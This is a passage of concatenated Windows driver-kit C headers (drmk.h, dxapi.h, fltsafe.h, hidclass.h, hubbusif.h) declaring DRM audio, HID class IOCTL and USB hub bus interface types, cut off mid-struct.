        PVOID* Interface
        ) PURE;
    STDMETHOD_(ULONG,AddRef)(THIS) PURE;
    STDMETHOD_(ULONG,Release)(THIS) PURE;
    STDMETHOD_(NTSTATUS,SetContentId)(THIS_
        IN ULONG ContentId,
        IN PCDRMRIGHTS DrmRights) PURE;
};

typedef IDrmAudioStream *PDRMAUDIOSTREAM;

#define IMP_IDrmAudioStream                 \
    STDMETHODIMP_(NTSTATUS) SetContentId    \
    (   IN      ULONG       ContentId,      \
        IN      PCDRMRIGHTS DrmRights       \
    );


#endif /* DRMK_H */


```

`include/ddk/dxapi.h`:

```h
ULONG
DxApiGetVersion(void);

ULONG
DxApi(
  IN ULONG dwFunctionNum,
  IN PVOID lpvInBuffer,
  IN ULONG cbInBuffer,
  IN PVOID lpvOutBuffer,
  IN ULONG cbOutBuffer);

```

`include/ddk/fltsafe.h`:

```h
#if (NTDDI_VERSION >= NTDDI_WINXP)
struct FLOATSAFE {
  KFLOATING_SAVE FloatSave;
  NTSTATUS ntStatus;
  FLOATSAFE::FLOATSAFE(void) {
    ntStatus = KeSaveFloatingPointState(&FloatSave);
  }
  FLOATSAFE::~FLOATSAFE(void) {
    if (NT_SUCCESS(ntStatus)) {
      KeRestoreFloatingPointState(&FloatSave);
    }
  }
};
#endif

```

`include/ddk/hidclass.h`:

```h
/*
 * hidclass.h
 *
 * HID class driver interface
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef __HIDCLASS_H
#define __HIDCLASS_H

#include "hidpi.h"

#ifdef __cplusplus
extern "C" {
#endif

#define HID_REVISION                      0x00000001

DEFINE_GUID (GUID_DEVINTERFACE_HID, \
  0x4D1E55B2L, 0xF16F, 0x11CF, 0x88, 0xCB, 0x00, 0x11, 0x11, 0x00, 0x00, 0x30);
DEFINE_GUID (GUID_HID_INTERFACE_NOTIFY, \
  0x2c4e2e88L, 0x25e6, 0x4c33, 0x88, 0x2f, 0x3d, 0x82, 0xe6, 0x07, 0x36, 0x81);
DEFINE_GUID (GUID_HID_INTERFACE_HIDPARSE, \
  0xf5c315a5, 0x69ac, 0x4bc2, 0x92, 0x79, 0xd0, 0xb6, 0x45, 0x76, 0xf4, 0x4b);

#define GUID_CLASS_INPUT GUID_DEVINTERFACE_HID

#define GUID_CLASS_INPUT_STR "4D1E55B2-F16F-11CF-88CB-001111000030"


#define HID_CTL_CODE(id) \
  CTL_CODE (FILE_DEVICE_KEYBOARD, (id), METHOD_NEITHER, FILE_ANY_ACCESS)
#define HID_BUFFER_CTL_CODE(id) \
  CTL_CODE (FILE_DEVICE_KEYBOARD, (id), METHOD_BUFFERED, FILE_ANY_ACCESS)
#define HID_IN_CTL_CODE(id) \
  CTL_CODE (FILE_DEVICE_KEYBOARD, (id), METHOD_IN_DIRECT, FILE_ANY_ACCESS)
#define HID_OUT_CTL_CODE(id) \
  CTL_CODE (FILE_DEVICE_KEYBOARD, (id), METHOD_OUT_DIRECT, FILE_ANY_ACCESS)


#define IOCTL_GET_PHYSICAL_DESCRIPTOR         HID_OUT_CTL_CODE(102)
#define IOCTL_HID_FLUSH_QUEUE                 HID_CTL_CODE(101)
#define IOCTL_HID_GET_COLLECTION_DESCRIPTOR   HID_CTL_CODE(100)
#define IOCTL_HID_GET_COLLECTION_INFORMATION  HID_BUFFER_CTL_CODE(106)
#define IOCTL_HID_GET_FEATURE                 HID_OUT_CTL_CODE(100)
#define IOCTL_HID_GET_HARDWARE_ID             HID_OUT_CTL_CODE(103)
#define IOCTL_HID_GET_INDEXED_STRING          HID_OUT_CTL_CODE(120)
#define IOCTL_HID_GET_INPUT_REPORT            HID_OUT_CTL_CODE(104)
#define IOCTL_HID_GET_MANUFACTURER_STRING     HID_OUT_CTL_CODE(110)
#define IOCTL_GET_NUM_DEVICE_INPUT_BUFFERS    HID_BUFFER_CTL_CODE(104)
#define IOCTL_HID_GET_POLL_FREQUENCY_MSEC     HID_BUFFER_CTL_CODE(102)
#define IOCTL_HID_GET_PRODUCT_STRING          HID_OUT_CTL_CODE(111)
#define IOCTL_HID_GET_SERIALNUMBER_STRING     HID_OUT_CTL_CODE(112)
#define IOCTL_HID_SET_FEATURE                 HID_IN_CTL_CODE(100)
#define IOCTL_SET_NUM_DEVICE_INPUT_BUFFERS    HID_BUFFER_CTL_CODE(105)
#define IOCTL_HID_SET_OUTPUT_REPORT           HID_IN_CTL_CODE(101)
#define IOCTL_HID_SET_POLL_FREQUENCY_MSEC     HID_BUFFER_CTL_CODE(103)

#define IOCTL_HID_GET_DRIVER_CONFIG           HID_BUFFER_CTL_CODE(100)
#define IOCTL_HID_SET_DRIVER_CONFIG           HID_BUFFER_CTL_CODE(101)
#define IOCTL_HID_GET_MS_GENRE_DESCRIPTOR     HID_OUT_CTL_CODE(121)

/* FIXME: these values are wrong! */
#define IOCTL_HID_GET_STRING                  0
#define IOCTL_HID_GET_DEVICE_ATTRIBUTES       1
#define IOCTL_HID_GET_DEVICE_DESCRIPTOR       2
#define IOCTL_HID_READ_REPORT                 3
#define IOCTL_HID_WRITE_REPORT                4
#define IOCTL_HID_GET_REPORT_DESCRIPTOR       5

typedef enum _HID_STRING_TYPE
{
	HID_STRING_INDEXED = 0,
	HID_STRING_ID_IMANUFACTURER,
	HID_STRING_ID_IPRODUCT,
	HID_STRING_ID_ISERIALNUMBER,
	HID_STRING_MAX
} HID_STRING_TYPE;

enum DeviceObjectState {
  DeviceObjectStarted = 0,
  DeviceObjectStopped,
  DeviceObjectRemoved
};

typedef VOID (NTAPI *PHID_STATUS_CHANGE)(
  PVOID  Context,
  enum DeviceObjectState  State);

typedef NTSTATUS (NTAPI *PHIDP_GETCAPS)(
  IN PHIDP_PREPARSED_DATA  PreparsedData,
  OUT PHIDP_CAPS  Capabilities);

typedef struct _HID_COLLECTION_INFORMATION {
  ULONG  DescriptorSize;
  BOOLEAN  Polled;
  UCHAR  Reserved1[1];
  USHORT  VendorID;
  USHORT  ProductID;
  USHORT  VersionNumber;
} HID_COLLECTION_INFORMATION, *PHID_COLLECTION_INFORMATION;

typedef struct _HID_DRIVER_CONFIG {
  ULONG  Size;
  ULONG  RingBufferSize;
} HID_DRIVER_CONFIG, *PHID_DRIVER_CONFIG;

typedef struct _HID_INTERFACE_HIDPARSE {
#ifdef __cplusplus
  INTERFACE  i;
#else
  /* GCC doesn't support including unnamed structs, so INTERFACE is
     expanded here */
  USHORT  Size;
  USHORT  Version;
  PVOID  Context;
  PINTERFACE_REFERENCE  InterfaceReference;
  PINTERFACE_DEREFERENCE  InterfaceDereference;
#endif
  PHIDP_GETCAPS  HidpGetCaps;
} HID_INTERFACE_HIDPARSE, *PHID_INTERFACE_HIDPARSE;

typedef struct _HID_INTERFACE_NOTIFY_PNP {
#ifdef __cplusplus
  INTERFACE  i;
#else
  /* GCC doesn't support including unnamed structs, so INTERFACE is
     expanded here */
  USHORT  Size;
  USHORT  Version;
  PVOID  Context;
  PINTERFACE_REFERENCE  InterfaceReference;
  PINTERFACE_DEREFERENCE  InterfaceDereference;
#endif
  PHID_STATUS_CHANGE  StatusChangeFn;
  PVOID  CallbackContext;
} HID_INTERFACE_NOTIFY_PNP, *PHID_INTERFACE_NOTIFY_PNP;

typedef struct _HID_XFER_PACKET {
  PUCHAR  reportBuffer;
  ULONG  reportBufferLen;
  UCHAR  reportId;
} HID_XFER_PACKET, *PHID_XFER_PACKET;

#ifdef __cplusplus
}
#endif

#endif /* __HIDCLASS_H */

```

`include/ddk/hubbusif.h`:

```h
#pragma once

#define _HUBBUSIF_

#include "usbdi.h"

#if (NTDDI_VERSION >= NTDDI_WINXP)

#if !defined(_USBBUSIF_)
typedef PVOID PUSB_DEVICE_HANDLE;
#endif

typedef struct _ROOTHUB_PDO_EXTENSION {
  ULONG Signature;
} ROOTHUB_PDO_EXTENSION, *PROOTHUB_PDO_EXTENSION;

#define USBD_DEVHACK_SLOW_ENUMERATION	0x00000001
#define USBD_DEVHACK_DISABLE_SN		0x00000002
#define USBD_DEVHACK_SET_DIAG_ID	0x00000004

#ifndef USB_BUSIFFN
#if defined(_ARM_)
#define USB_BUSIFFN
#else
#define USB_BUSIFFN __stdcall
#endif
#endif

#define CD_ERR_V1			0x00000001

#define ID_ERR_V1			0x00000001

#define USBD_KEEP_DEVICE_DATA		0x00000001
#define USBD_MARK_DEVICE_BUSY		0x00000002

#define USB_IDLE_NOT_READY		0
#define USB_IDLE_READY			1

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_CREATE_USB_DEVICE (
  IN PVOID BusContext,
  OUT PUSB_DEVICE_HANDLE *NewDeviceHandle,
  IN PUSB_DEVICE_HANDLE HubDeviceHandle,
  IN USHORT PortStatus,
  IN USHORT PortNumber);

typedef USB_BUSIFFN_CREATE_USB_DEVICE *PUSB_BUSIFFN_CREATE_USB_DEVICE;

typedef enum _USBPORT_CREATEDEV_ERROR {
  CreateDevErrNotSet = 0,
  CreateDevBadHubDevHandle,
  CreateDevFailedAllocDevHandle,
  CreateDevFailedOpenEndpoint,
  CreateDevFailedAllocDsBuff,
  CreateDevFailedGetDs,
  CreateDevTtNotFound,
  CreateDevBadDevHandlePtr
} USBPORT_CREATEDEV_ERROR;

typedef struct _USB_CD_ERROR_INFORMATION {
  ULONG Version;
  USBPORT_CREATEDEV_ERROR PathError;
  ULONG UlongArg1;
  ULONG UlongArg2;
  NTSTATUS NtStatus;
  UCHAR XtraInfo[64];
} USB_CD_ERROR_INFORMATION, *PUSB_CD_ERROR_INFORMATION;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_CREATE_USB_DEVICE_EX (
  IN PVOID  BusContext,
  OUT PUSB_DEVICE_HANDLE  *NewDeviceHandle,
  IN PUSB_DEVICE_HANDLE  HsHubDeviceHandle,
  IN USHORT  PortStatus,
  IN USHORT  PortNumber,
  OUT PUSB_CD_ERROR_INFORMATION  CdErrorInfo,
  IN USHORT TtPortNumber);

typedef USB_BUSIFFN_CREATE_USB_DEVICE_EX *PUSB_BUSIFFN_CREATE_USB_DEVICE_EX;

typedef struct _USB_PORT_PATH {
  ULONG  PortPathDepth;
  ULONG  PortPath[6];
} USB_PORT_PATH, *PUSB_PORT_PATH;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_CREATE_USB_DEVICE_V7 (
  IN PVOID  BusContext,
  OUT PUSB_DEVICE_HANDLE  *NewDeviceHandle,
  IN PUSB_DEVICE_HANDLE  HsHubDeviceHandle,
  IN USHORT  PortStatus,
  IN PUSB_PORT_PATH  PortPath,
  OUT PUSB_CD_ERROR_INFORMATION  CdErrorInfo,
  IN USHORT  TtPortNumber,
  IN PDEVICE_OBJECT  PdoDeviceObject,
  IN PUNICODE_STRING  PhysicalDeviceObjectName);

typedef USB_BUSIFFN_CREATE_USB_DEVICE_V7 *PUSB_BUSIFFN_CREATE_USB_DEVICE_V7;

typedef enum _USBPORT_INITDEV_ERROR {
  InitDevErrNotSet = 0,
  InitDevFailedSetAddress,
  InitDevFailedPokeEndpoint,
  InitDevBadDeviceDescriptor
} USBPORT_INITDEV_ERROR;

typedef struct _USB_ID_ERROR_INFORMATION {
  ULONG Version;
  USBPORT_INITDEV_ERROR PathError;
  ULONG Arg1;
  ULONG UsbAddress;
  NTSTATUS NtStatus;
  USBD_STATUS UsbdStatus;
  UCHAR XtraInfo[64];
} USB_ID_ERROR_INFORMATION, *PUSB_ID_ERROR_INFORMATION;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_INITIALIZE_USB_DEVICE (
  IN PVOID  BusContext,
  IN OUT PUSB_DEVICE_HANDLE  DeviceHandle);

typedef USB_BUSIFFN_INITIALIZE_USB_DEVICE *PUSB_BUSIFFN_INITIALIZE_USB_DEVICE;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_INITIALIZE_USB_DEVICE_EX (
  IN PVOID  BusContext,
  IN OUT PUSB_DEVICE_HANDLE  DeviceHandle,
  OUT PUSB_ID_ERROR_INFORMATION  IdErrInfo);

typedef USB_BUSIFFN_INITIALIZE_USB_DEVICE_EX *PUSB_BUSIFFN_INITIALIZE_USB_DEVICE_EX;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_REMOVE_USB_DEVICE (
  IN PVOID  BusContext,
  IN OUT PUSB_DEVICE_HANDLE  DeviceHandle,
  IN ULONG  Flags);

typedef USB_BUSIFFN_REMOVE_USB_DEVICE *PUSB_BUSIFFN_REMOVE_USB_DEVICE;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_GET_USB_DESCRIPTORS (
  IN PVOID BusContext,
  IN OUT PUSB_DEVICE_HANDLE DeviceHandle,
  OUT PUCHAR DeviceDescriptorBuffer,
  IN OUT PULONG DeviceDescriptorBufferLength,
  OUT PUCHAR ConfigDescriptorBuffer,
  IN OUT PULONG ConfigDescriptorBufferLength);

typedef USB_BUSIFFN_GET_USB_DESCRIPTORS *PUSB_BUSIFFN_GET_USB_DESCRIPTORS;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_RESTORE_DEVICE (
  IN PVOID BusContext,
  IN OUT PUSB_DEVICE_HANDLE OldDeviceHandle,
  IN OUT PUSB_DEVICE_HANDLE NewDeviceHandle);

typedef USB_BUSIFFN_RESTORE_DEVICE *PUSB_BUSIFFN_RESTORE_DEVICE;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_GET_POTRTHACK_FLAGS (
  IN PVOID BusContext,
  IN OUT PULONG Flags);

typedef USB_BUSIFFN_GET_POTRTHACK_FLAGS *PUSB_BUSIFFN_GET_POTRTHACK_FLAGS;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_GET_DEVICE_INFORMATION (
  IN PVOID BusContext,
  IN PUSB_DEVICE_HANDLE DeviceHandle,
  OUT PVOID DeviceInformationBuffer,
  IN ULONG DeviceInformationBufferLength,
  IN OUT PULONG LengthOfDataCopied);

typedef USB_BUSIFFN_GET_DEVICE_INFORMATION *PUSB_BUSIFFN_GET_DEVICE_INFORMATION;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_GET_CONTROLLER_INFORMATION (
  IN PVOID BusContext,
  IN OUT PVOID ControllerInformationBuffer,
  IN ULONG ControllerInformationBufferLength,
  IN OUT PULONG LengthOfDataCopied);

typedef USB_BUSIFFN_GET_CONTROLLER_INFORMATION *PUSB_BUSIFFN_GET_CONTROLLER_INFORMATION;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_CONTROLLER_SELECTIVE_SUSPEND (
  IN PVOID BusContext,
  IN BOOLEAN Enable);

typedef USB_BUSIFFN_CONTROLLER_SELECTIVE_SUSPEND *PUSB_BUSIFFN_CONTROLLER_SELECTIVE_SUSPEND;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_GET_EXTENDED_HUB_INFO (
  IN PVOID BusContext,
  IN PDEVICE_OBJECT HubPhysicalDeviceObject,
  IN PVOID HubInformationBuffer,
  IN ULONG HubInformationBufferLength,
  OUT PULONG LengthOfDataCopied);

typedef USB_BUSIFFN_GET_EXTENDED_HUB_INFO *PUSB_BUSIFFN_GET_EXTENDED_HUB_INFO;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_GET_ROOTHUB_SYM_NAME (
  IN PVOID BusContext,
  IN PVOID HubSymNameBuffer,
  IN ULONG HubSymNameBufferLength,
  OUT PULONG HubSymNameActualLength);

typedef USB_BUSIFFN_GET_ROOTHUB_SYM_NAME *PUSB_BUSIFFN_GET_ROOTHUB_SYM_NAME;

typedef
PVOID
USB_BUSIFFN
USB_BUSIFFN_GET_DEVICE_BUSCONTEXT (
  IN PVOID HubBusContext,
  IN PVOID DeviceHandle);

typedef USB_BUSIFFN_GET_DEVICE_BUSCONTEXT *PUSB_BUSIFFN_GET_DEVICE_BUSCONTEXT;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_INITIALIZE_20HUB (
  IN PVOID BusContext,
  IN PUSB_DEVICE_HANDLE HubDeviceHandle,
  IN ULONG TtCount);

typedef USB_BUSIFFN_INITIALIZE_20HUB *PUSB_BUSIFFN_INITIALIZE_20HUB;

typedef
BOOLEAN
USB_BUSIFFN
USB_BUSIFFN_IS_ROOT (
  IN PVOID BusContext,
  IN PVOID DeviceObject);

typedef USB_BUSIFFN_IS_ROOT *PUSB_BUSIFFN_IS_ROOT;

typedef
VOID
USB_BUSIFFN
USB_BUSIFFN_ACQUIRE_SEMAPHORE (
  IN PVOID BusContext);

typedef USB_BUSIFFN_ACQUIRE_SEMAPHORE *PUSB_BUSIFFN_ACQUIRE_SEMAPHORE;

typedef
VOID
USB_BUSIFFN
USB_BUSIFFN_RELEASE_SEMAPHORE (
  IN PVOID BusContext);

typedef USB_BUSIFFN_RELEASE_SEMAPHORE *PUSB_BUSIFFN_RELEASE_SEMAPHORE;

typedef
VOID
__stdcall
RH_INIT_CALLBACK (
  IN PVOID CallBackContext);

typedef RH_INIT_CALLBACK *PRH_INIT_CALLBACK;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_ROOTHUB_INIT_NOTIFY (
  IN PVOID BusContext,
  IN PVOID CallbackContext,
  IN PRH_INIT_CALLBACK CallbackRoutine);

typedef USB_BUSIFFN_ROOTHUB_INIT_NOTIFY *PUSB_BUSIFFN_ROOTHUB_INIT_NOTIFY;

typedef
VOID
USB_BUSIFFN
USB_BUSIFFN_FLUSH_TRANSFERS (
  IN PVOID BusContext,
  IN PVOID DeviceHandle);

typedef USB_BUSIFFN_FLUSH_TRANSFERS *PUSB_BUSIFFN_FLUSH_TRANSFERS;

typedef
ULONG
USB_BUSIFFN
USB_BUSIFFN_CALC_PIPE_BANDWIDTH (
  IN PVOID BusContext,
  IN PUSBD_PIPE_INFORMATION PipeInfo,
  IN USB_DEVICE_SPEED DeviceSpeed);

typedef USB_BUSIFFN_CALC_PIPE_BANDWIDTH *PUSB_BUSIFFN_CALC_PIPE_BANDWIDTH;

typedef
VOID
USB_BUSIFFN
USB_BUSIFFN_SET_BUS_WAKE_MODE (
  IN PVOID BusContext,
  IN ULONG Mode);

typedef USB_BUSIFFN_SET_BUS_WAKE_MODE *PUSB_BUSIFFN_SET_BUS_WAKE_MODE;

typedef
VOID
USB_BUSIFFN
USB_BUSIFFN_SET_DEVICE_FLAG (
  IN PVOID BusContext,
  IN GUID *DeviceFlagGuid,
  IN PVOID ValueData,
  IN ULONG ValueLength);

typedef USB_BUSIFFN_SET_DEVICE_FLAG *PUSB_BUSIFFN_SET_DEVICE_FLAG;

typedef
VOID
USB_BUSIFFN
USB_BUSIFFN_SET_DEVHANDLE_DATA (
  IN PVOID BusContext,
  IN PVOID DeviceHandle,
  IN PDEVICE_OBJECT UsbDevicePdo);

typedef USB_BUSIFFN_SET_DEVHANDLE_DATA *PUSB_BUSIFFN_SET_DEVHANDLE_DATA;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_TEST_POINT (
  IN PVOID BusContext,
  IN PVOID DeviceHandle,
  IN ULONG Opcode,
  IN PVOID TestData);

typedef USB_BUSIFFN_TEST_POINT *PUSB_BUSIFFN_TEST_POINT;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_GET_DEVICE_PERFORMANCE_INFO (
  IN PVOID BusContext,
  IN PUSB_DEVICE_HANDLE DeviceHandle,
  OUT PVOID DeviceInformationBuffer,
  IN ULONG DeviceInformationBufferLength,
  IN OUT PULONG LengthOfDataCopied);

typedef USB_BUSIFFN_GET_DEVICE_PERFORMANCE_INFO *PUSB_BUSIFFN_GET_DEVICE_PERFORMANCE_INFO;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_WAIT_ASYNC_POWERUP (
  IN PVOID BusContext);

typedef USB_BUSIFFN_WAIT_ASYNC_POWERUP *PUSB_BUSIFFN_WAIT_ASYNC_POWERUP;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_GET_DEVICE_ADDRESS (
  IN PVOID BusContext,
  IN PUSB_DEVICE_HANDLE DeviceHandle,
  OUT PUSHORT DeviceAddress);

typedef USB_BUSIFFN_GET_DEVICE_ADDRESS *PUSB_BUSIFFN_GET_DEVICE_ADDRESS;

typedef
VOID
USB_BUSIFFN
USB_BUSIFFN_DEREF_DEVICE_HANDLE (
  IN PVOID BusContext,
  IN PUSB_DEVICE_HANDLE DeviceHandle,
  IN PVOID Object,
  IN ULONG Tag);

typedef USB_BUSIFFN_DEREF_DEVICE_HANDLE *PUSB_BUSIFFN_DEREF_DEVICE_HANDLE;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_REF_DEVICE_HANDLE (
  IN PVOID BusContext,
  IN PUSB_DEVICE_HANDLE DeviceHandle,
  IN PVOID Object,
  IN ULONG Tag);

typedef USB_BUSIFFN_REF_DEVICE_HANDLE *PUSB_BUSIFFN_REF_DEVICE_HANDLE;

typedef
ULONG
USB_BUSIFFN
USB_BUSIFFN_SET_DEVICE_HANDLE_IDLE_READY_STATE (
  IN PVOID BusContext,
  IN PUSB_DEVICE_HANDLE DeviceHandle,
  IN ULONG NewIdleReadyState);

typedef USB_BUSIFFN_SET_DEVICE_HANDLE_IDLE_READY_STATE *PUSB_BUSIFFN_SET_DEVICE_HANDLE_IDLE_READY_STATE;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_GET_CONTAINER_ID_FOR_PORT (
  IN PVOID BusContext,
  IN USHORT PortNumber,
  OUT LPGUID ContainerId);

typedef USB_BUSIFFN_GET_CONTAINER_ID_FOR_PORT *PUSB_BUSIFFN_GET_CONTAINER_ID_FOR_PORT;

typedef
VOID
USB_BUSIFFN
USB_BUSIFFN_SET_CONTAINER_ID_FOR_PORT (
  IN PVOID BusContext,
  IN USHORT PortNumber,
  IN LPGUID ContainerId);

typedef USB_BUSIFFN_SET_CONTAINER_ID_FOR_PORT *PUSB_BUSIFFN_SET_CONTAINER_ID_FOR_PORT;

typedef
NTSTATUS
USB_BUSIFFN
USB_BUSIFFN_ABORT_ALL_DEVICE_PIPES (
  IN PVOID BusContext,
  IN PUSB_DEVICE_HANDLE DeviceHandle);

typedef USB_BUSIFFN_ABORT_ALL_DEVICE_PIPES *PUSB_BUSIFFN_ABORT_ALL_DEVICE_PIPES;

#define ERRATA_FLAG_RESET_TT_ON_CANCEL			1
#define ERRATA_FLAG_NO_CLEAR_TT_BUFFER_ON_CANCEL	2

#define USB_BUSIF_HUB_VERSION_0		0x0000
#define USB_BUSIF_HUB_VERSION_1		0x0001
#define USB_BUSIF_HUB_VERSION_2		0x0002
#define USB_BUSIF_HUB_VERSION_3		0x0003
#define USB_BUSIF_HUB_VERSION_4		0x0004
#define USB_BUSIF_HUB_VERSION_5		0x0005
#define USB_BUSIF_HUB_VERSION_6		0x0006
#define USB_BUSIF_HUB_VERSION_7		0x0007

#define USB_BUSIF_HUB_MIDUMP_VERSION_0	0x0000

#define USB_BUSIF_HUB_SS_VERSION_0	0x0000

typedef
VOID
USB_BUSIFFN
USB_BUSIFFN_SET_DEVICE_ERRATA_FLAG (
  IN PVOID BusContext,
  IN PUSB_DEVICE_HANDLE DeviceHandle,
  IN ULONG DeviceErrataFlag);

typedef USB_BUSIFFN_SET_DEVICE_ERRATA_FLAG *PUSB_BUSIFFN_SET_DEVICE_ERRATA_FLAG;

DEFINE_GUID(USB_BUS_INTERFACE_HUB_GUID,
0xb2bb8c0a, 0x5ab4, 0x11d3, 0xa8, 0xcd, 0x0, 0xc0, 0x4f, 0x68, 0x74, 0x7a);

typedef struct _USB_BUS_INTERFACE_HUB_V0 {
  USHORT Size;
  USHORT Version;
  PVOID BusContext;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
} USB_BUS_INTERFACE_HUB_V0, *PUSB_BUS_INTERFACE_HUB_V0;

typedef struct _USB_BUS_INTERFACE_HUB_V1 {
  USHORT Size;
  USHORT Version;
  PVOID BusContext;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PUSB_BUSIFFN_CREATE_USB_DEVICE CreateUsbDevice;
  PUSB_BUSIFFN_INITIALIZE_USB_DEVICE InitializeUsbDevice;
  PUSB_BUSIFFN_GET_USB_DESCRIPTORS GetUsbDescriptors;
  PUSB_BUSIFFN_REMOVE_USB_DEVICE RemoveUsbDevice;
  PUSB_BUSIFFN_RESTORE_DEVICE RestoreUsbDevice;
  PUSB_BUSIFFN_GET_POTRTHACK_FLAGS GetPortHackFlags;
  PUSB_BUSIFFN_GET_DEVICE_INFORMATION QueryDeviceInformation;
} USB_BUS_INTERFACE_HUB_V1, *PUSB_BUS_INTERFACE_HUB_V1;

typedef struct _USB_BUS_INTERFACE_HUB_V2 {
  USHORT Size;
  USHORT Version;
  PVOID BusContext;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PUSB_BUSIFFN_CREATE_USB_DEVICE CreateUsbDevice;
  PUSB_BUSIFFN_INITIALIZE_USB_DEVICE InitializeUsbDevice;
  PUSB_BUSIFFN_GET_USB_DESCRIPTORS GetUsbDescriptors;
  PUSB_BUSIFFN_REMOVE_USB_DEVICE RemoveUsbDevice;
  PUSB_BUSIFFN_RESTORE_DEVICE RestoreUsbDevice;
  PUSB_BUSIFFN_GET_POTRTHACK_FLAGS GetPortHackFlags;
  PUSB_BUSIFFN_GET_DEVICE_INFORMATION QueryDeviceInformation;
  PUSB_BUSIFFN_GET_CONTROLLER_INFORMATION GetControllerInformation;
  PUSB_BUSIFFN_CONTROLLER_SELECTIVE_SUSPEND ControllerSelectiveSuspend;
  PUSB_BUSIFFN_GET_EXTENDED_HUB_INFO GetExtendedHubInformation;
  PUSB_BUSIFFN_GET_ROOTHUB_SYM_NAME GetRootHubSymbolicName;
  PUSB_BUSIFFN_GET_DEVICE_BUSCONTEXT GetDeviceBusContext;    
  PUSB_BUSIFFN_INITIALIZE_20HUB Initialize20Hub;
} USB_BUS_INTERFACE_HUB_V2, *PUSB_BUS_INTERFACE_HUB_V2;

typedef struct _USB_BUS_INTERFACE_HUB_V3 {
  USHORT Size;
  USHORT Version;
  PVOID BusContext;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PUSB_BUSIFFN_CREATE_USB_DEVICE CreateUsbDevice;
  PUSB_BUSIFFN_INITIALIZE_USB_DEVICE InitializeUsbDevice;
  PUSB_BUSIFFN_GET_USB_DESCRIPTORS GetUsbDescriptors;
  PUSB_BUSIFFN_REMOVE_USB_DEVICE RemoveUsbDevice;
  PUSB_BUSIFFN_RESTORE_DEVICE RestoreUsbDevice;
  PUSB_BUSIFFN_GET_POTRTHACK_FLAGS GetPortHackFlags;
  PUSB_BUSIFFN_GET_DEVICE_INFORMATION QueryDeviceInformation;
  PUSB_BUSIFFN_GET_CONTROLLER_INFORMATION GetControllerInformation;
  PUSB_BUSIFFN_CONTROLLER_SELECTIVE_SUSPEND ControllerSelectiveSuspend;
  PUSB_BUSIFFN_GET_EXTENDED_HUB_INFO GetExtendedHubInformation;
  PUSB_BUSIFFN_GET_ROOTHUB_SYM_NAME GetRootHubSymbolicName;
  PUSB_BUSIFFN_GET_DEVICE_BUSCONTEXT GetDeviceBusContext;
  PUSB_BUSIFFN_INITIALIZE_20HUB Initialize20Hub;
  PUSB_BUSIFFN_ROOTHUB_INIT_NOTIFY RootHubInitNotification;
} USB_BUS_INTERFACE_HUB_V3, *PUSB_BUS_INTERFACE_HUB_V3;

typedef struct _USB_BUS_INTERFACE_HUB_V4 {
  USHORT Size;
  USHORT Version;
  PVOID BusContext;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PUSB_BUSIFFN_CREATE_USB_DEVICE CreateUsbDevice;
  PUSB_BUSIFFN_INITIALIZE_USB_DEVICE InitializeUsbDevice;
  PUSB_BUSIFFN_GET_USB_DESCRIPTORS GetUsbDescriptors;
  PUSB_BUSIFFN_REMOVE_USB_DEVICE RemoveUsbDevice;
  PUSB_BUSIFFN_RESTORE_DEVICE RestoreUsbDevice;
  PUSB_BUSIFFN_GET_POTRTHACK_FLAGS GetPortHackFlags;
  PUSB_BUSIFFN_GET_DEVICE_INFORMATION QueryDeviceInformation;
  PUSB_BUSIFFN_GET_CONTROLLER_INFORMATION GetControllerInformation;
  PUSB_BUSIFFN_CONTROLLER_SELECTIVE_SUSPEND ControllerSelectiveSuspend;
  PUSB_BUSIFFN_GET_EXTENDED_HUB_INFO GetExtendedHubInformation;
  PUSB_BUSIFFN_GET_ROOTHUB_SYM_NAME GetRootHubSymbolicName;
  PUSB_BUSIFFN_GET_DEVICE_BUSCONTEXT GetDeviceBusContext;
  PUSB_BUSIFFN_INITIALIZE_20HUB Initialize20Hub;
  PUSB_BUSIFFN_ROOTHUB_INIT_NOTIFY RootHubInitNotification;
  PUSB_BUSIFFN_FLUSH_TRANSFERS FlushTransfers;
} USB_BUS_INTERFACE_HUB_V4, *PUSB_BUS_INTERFACE_HUB_V4;

typedef struct _USB_BUS_INTERFACE_HUB_V5 {
  USHORT Size;
  USHORT Version;
  PVOID BusContext;
